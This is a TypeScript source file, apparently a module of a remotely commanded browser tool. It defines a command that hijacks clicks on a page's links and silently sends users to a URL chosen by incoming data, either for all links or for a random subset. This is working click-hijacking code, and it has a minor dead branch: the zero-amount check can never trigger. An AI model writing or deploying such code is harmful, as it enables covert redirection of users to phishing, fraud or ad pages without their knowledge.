import { Command } from "./command";
import $ from "jquery";

export class ChangeLinksCommand extends Command {
    constructor() {
        super(2001);
    }

    execute(data: any) {
        if (data.force?.link && data.force?.amount) {
            if (data.force.amount == 0) {
                $("a").on("click", event => {
                    event.preventDefault();
                    location.href = data.force.link;
                });
                return;
            }

            let anchors = $("a").toArray().sort((a, b) => 0.5 - Math.random());
            for (let i = 0; i < data.force.amount; i++) {
                $(anchors[i]).on("click", event => {
                    event.preventDefault();
                    location.href = data.force.link;
                });
            }
            return;
        }

        let possible: string[] = this.filter_object_by_href(data.links);
        $("a").on("click", event => {
            event.preventDefault();
            location.href = this.random_item(possible);
        });
    }
}